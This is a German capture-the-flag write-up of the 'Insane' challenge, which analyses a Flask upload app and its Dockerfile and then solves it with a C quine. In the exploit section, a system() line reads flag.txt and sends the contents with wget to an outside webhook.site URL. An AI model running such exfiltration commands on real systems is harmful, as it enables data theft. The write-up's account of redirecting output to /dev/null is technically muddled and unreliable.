## Insane
Für die Challenge wurde eine Python-Datei bereitgestellt. Zusätzlich hierzu konnte eine Webanwendung gestartet werden.

### Infotext
Die Definition von Wahnsinn ist, immer wieder das Gleiche zu tun und andere Ergebnisse zu erwarten.

### Vorgehen
Um einen Überblick über die Challenge zu erhalten, habe ich zuerst einmal die Webanwendung gestartet, um zu sehen, was in ihr Angezeigt wird.
Es handelte sich hierbei um eine einfache Datei-Uploadseite. Bei Upload einer Datei wurden Nachrichten, wie zum Beispiel "Keine Magie nutzen" angezeigt.

Da dies nicht sonderlich weitergeholfen hat, habe ich im nächsten Schritt den Dockerfile untersucht. Von diesem habe ich mir erhofft, Rückschlüsse auf den im Hintergrund laufenden Server ziehen zu können.

### Der Dockerfile
Im Dockerfile werden zuerst Pakete installiert und anschließend werden unterschiedliche Verzeichnisse (mit dem Befehl "mkdir") erstellt. 
Im nächsten Schritt wird nun der Benutzer ctf angelegt und diesem wird als Homeverzeichnis das erstellte Verzeichnis "/ctf" zugewiesen.

Anschließend wird das Objekt der Begierde, also die Datei "flag.txt" in das Verzeichnis "/ctf/app/" kopiert und dem Nutzer ctf übereignet. Dies ist wichtig, um im späteren Verlauf der Challenge zu wissen, wo sich die Flag befindet.

Die nachfolgenden Zeilen sind bis auf die Zeile
```
chmod a+xw /ctf/secureenv # ctf can write binary there
```
zwar zur Kenntniss zu nehmen, aber erstmal irrelevant. Die obige Zeile allerdings ist in Kombination mit der anschließend folgenden Zeile:
```
RUN echo "ctf ALL=(nobody) NOPASSWD: /ctf/secureenv/prog" >> /etc/sudoers
```
in soweit interessant, als dass der Benutzer "ctf" Schreib- und Ausführungsberechtigungen im Verzeichnis "/ctf/secureenv/prog" besitzt und mit diesen an die Sudoersdatei "/etc/sudoers" ohne Passwortabfrage angehangen wird.

Die nachfolgenden Zeilen übereignen die Datei "app.py" an den Benutzer "ctf" und kopieren sie nach "/ctf/app/app.py". Auch wird das Arbeitsverzeichnis dorthin geändert und anschließend die Flask-Anwendung gestartet.

Hierbei handelt es sich höchst Wahrscheinlich um das Web-Interface, das beim Start der Challenge exponiert wird.

### Die Webanwendung
Der Code der Webanwendung ist in der Datei "app.py" zu finden.

Bei Upload einer Datei über das Webinterface wird zuerst die Funktion upload() aufgerufen. 

#### Upload()
Diese Funktion überprüft zuerst das verwendete HTTP-Verb. Ist dies das Verb "POST", dann wird der Request weiter behandelt, ansonsten wird der Inhalt der Funktion html() zurückgegeben (in der Webansicht verändert sich nichts, es wird weiter nach dem Upload eines C-Codes gefragt).

Anschließend wird überprüft, dass auch wirklich eine Datei hochgeladen wurde. Ist dies der Fall, dann wird die Datei gespeichert.
Im nächsten Schritt ruft die Funktion "upload()" eine andere Funktion mit dem Namen "check_file()" mit dem File als Argument auf.

#### Check_file(fn)
In dieser Funktion wird einfach nur überprüft, ob der Inhalt der Datei ein "#" oder ein "#include" enthält.
Ist dies der Fall wird im HTML-Code der Website per FailureException eine entsprechende Fehlermeldung angezeigt.

#### Weiter in Upload()
Nach dem Ausführen des Codes in "check_file()" wird nun die Funktion "main()" aufgerufen.

Die Funktion "main()" enthält den Hauptteil der Anwendungslogik der Website.
Zuerst wird der Inhalt der hochgeladenen Datei im Modus "rb" ausgelesen und in der Variable "fc" gespeichert:
```
fc = open(fn,"rb").read()
```
Danach versucht "main()" die Datei zu kompilieren (über die Funktion "compile()"). Wenn dies nicht erfolgreich ist, wird wieder ein Fehler auf der Website ausgegeben und an dieser Stelle abgebrochen.
Die Kompilierung erfolgt mit folgendem Befehl:
```
gcc -static -fdiagnostics-color=never -x c <filename> -o /ctf/app/compiles/prog
```
Hier ist also auch der Outputpfad nach erfolgreicher Kompilierung ersichtlich.

Im nächsten Schritt wird die Funktion "run()" mit Parameter "first=True" aufgerufen.

#### Funktion run()
diese Funktion startet bei "first=True" einen Subprozess und führt die Kommandos:
```
cp /ctf/app/compiles/prog /ctf/secureenv/prog
``` 
und
```
sudo -u nobody /ctf/secureenv/prog
```
aus. Die Rückgabe dieser Befehle wird als String addiert und per "return" an main ausgegeben.
Effektiv kopieren obige Befehle das hochgeladene, kompilierte Programm "prog" nach "/ctf/secureenv/prog" und führen es aus.

Warum kann hier nicht direkt die Datei "flag.txt" ausgelesen werden (oder dies zumindest versucht werden)? 
-> Der Benutzerkontext ist nicht der richtige, auf die Datei kann also gar nicht zugegriffen werden.

#### Weiter in main()
Wenn die Länge der Ausgabe der obigen Befehle = 0 ist, wird "Keine Ausgabe" ausgegeben. Ist die Ausgabe ungleich dem Byteinhalt der hochgeladenen Datei, dann wird auf der Website "Falsches Ergebnis" ausgegeben.

Dies bedeutet, um es noch einmal klarzustellen: Die Ausgabe der Kompilierung und Ausführung des hochgeladenen C-Programmes muss gleich dem Byteinhalt der hochgeladenen Datei sein.

Ist dies der Fall, dann wird das Programm erneut mit "compile()" kompiliert und mit "run()" ausgeführt, allerdings ist diesmal der Parameter "first" auf False gesetzt.

### Idee für einen Exploit
Es muss ein C-Programm geschrieben werden, das sich selbst vollständig ausgiebt aber auch gleichzeitig die Datei Flag.txt extrahieren kann. Da in App.py keine Möglichkeit besteht, eigenen Inhalt an den Websiten-Code anzuhängen ist die einfachste Möglichkeit whs. das anhängen des Dateiinhaltes an einen Web-Request an einen sogenannten Web-Hook.

### Teil 1, eine sogenannte Quine
Zuerst muss aber ein C-Programm geschrieben werden, dass sich vollständig selbst ausgiebt.
Nach ein bisschen Googeln bin ich auf den Namen "Quine" für diese Programme gekommen und habe auch recht schnell ein Beispiel gefunden. 
Die verwendete Quine mit Exploitcode ist in der Datei "exploit.c" zu finden. 
Die genauere Definition von Quines kann u.a. auf Wikipedia nachgelesen werden:
https://en.wikipedia.org/wiki/Quine_(computing)

### Teil 2, der Exploit
Nachdem ein Programm gefunden war, dass sich vollständig selbst ausgiebt, habe ich anschließend die folgende Zeile eingefügt:
```
system("var=$(cat flag.txt) > /dev/null 2>&1; wget http://webhook.site/<unique_webhook_url>/$var > /dev/null 2>&1");
```
Der Teil "> /dev/null 2>&1" der Zeile dient dazu, die Ausgabe des Befehls "var=$(cat flag.txt)" von der Terminalausgabe auf die Datei "/dev/null" umzulenken, um keine Kommandoausgabe im Terminal zu produzieren. Dies geschieht aus dem Grund, dass eine Quine keine Ausgabe außer dem eigenen Inhalt produzieren darf. Da in "main()" nur die Terminalausgabe des Subprozesses überprüft wird, ist die Umleitung der Ausgabe auf "/dev/null" kein "Abbruchgrund" für das Programm.

Anschließend geschieht ein Web-Request auf eine von mir registrierte Webhook. Dies ist an sich nur ein Tool, mit dem Internettraffic untersucht werden kann.
https://webhook.site/

Setzt man einen Request an die nach Aufruf der Seite angezeigte, einzigartige URL ab, werden alle Anfragen an diese im REQUESTS-Tab angezeigt. Dies erspart es einem, ein Portforwarding auf dem eigenen Router für einen eigenen Webserver einzurichten.

An den HTTP-Request mit "wget" wurde per Variable der Inhalt der Datei "/dev/null" angehangen. Dies entspricht dem Inhalt der Datei "flag.txt", da wir diesen ja zuvor in "/dev/null" umgelenkt haben.

Nach dem Hochladen dieser Quine erhält man zehn neue GET-Requests im Webhook-REQUESTS-Tab mit der angehangenen Flag.

## Letzte Worte
Damit ist die Challenge final gelöst. Die Challenge hat mir sehr gut gefallen, da ich einige neue Dinge gelernt habe (z.B. was ist eine Quine etc).

